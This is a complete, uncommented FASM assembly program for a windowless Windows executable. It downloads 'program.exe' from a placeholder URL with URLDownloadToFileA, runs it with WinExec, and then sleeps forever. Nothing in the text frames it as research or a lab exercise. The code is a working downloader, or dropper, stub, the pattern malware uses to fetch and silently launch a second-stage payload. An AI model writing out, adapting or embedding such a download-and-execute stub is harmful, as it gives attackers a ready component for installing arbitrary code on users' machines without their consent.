format PE GUI 4.0
entry start

include 'win32a.inc'

section '.data' data readable writeable
url     db 'https://example.com/program.exe',0
fpath   db 'program.exe',0
cmd     db 'program.exe',0

section '.code' readable executable
start:
    push 0
    push 0
    push fpath
    push url
    push 0
    call [URLDownloadToFileA]

    push 1
    push cmd
    call [WinExec]

inf_loop:
    push 500
    call [Sleep]
    jmp inf_loop

section '.idata' import data readable
    library kernel32,'KERNEL32.DLL',urlmon,'URLMON.DLL'

    import kernel32,Sleep,'Sleep',WinExec,'WinExec'
    import urlmon,URLDownloadToFileA,'URLDownloadToFileA'                       
